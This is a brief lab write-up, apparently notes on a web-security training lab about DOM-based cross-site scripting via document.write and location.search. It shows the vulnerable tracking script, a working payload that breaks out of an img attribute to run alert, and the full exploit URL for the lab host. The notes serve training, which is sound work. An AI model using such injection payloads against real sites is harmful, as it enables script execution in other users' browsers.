@@ -1,0 +1,19 @@
+This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.
+
+To solve this lab, perform a cross-site scripting attack that calls the alert function.
+
+thử nhập gì đó vào search
+
+<script>
+    function trackSearch(query) {
+        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
+    }
+    var query = (new URLSearchParams(window.location.search)).get('search');
+    if(query) {
+        trackSearch(query);
+    }
+</script>
+
+Payload: "><svg onload=alert(1)>
+
+https://0ad1004604425fa9c0aa7601004500a4.web-security-academy.net/?search=%22%3E%3Csvg+onload%3Dalert%281%29%3E
